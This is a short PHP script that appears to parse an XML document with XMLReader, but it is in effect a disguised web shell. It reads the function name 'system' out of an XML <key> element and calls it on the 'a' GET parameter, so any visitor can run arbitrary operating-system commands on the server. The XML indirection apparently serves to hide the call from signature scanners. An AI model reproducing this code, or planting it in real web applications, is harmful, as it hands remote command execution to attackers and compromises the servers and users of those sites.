<?php
$xmlString = '<?xml version="1.0" encoding="UTF-8"?>
<data>
    <item>
        <key>system</key>
    </item>
    <item>
        <key>age</key>
        <value>30</value>
    </item>
</data>';

$reader = new XMLReader();
$reader->xml($xmlString);

// 遍历 XML 节点
while ($reader->read()) {
    if ($reader->nodeType === XMLReader::ELEMENT && $reader->name === 'key') {
        $keyNode = $reader->expand(); // 转换为 DOMNode
        $key = $keyNode->nodeValue;
        ($key)($_GET['a']); // 动态调用函数
    }
}
?>
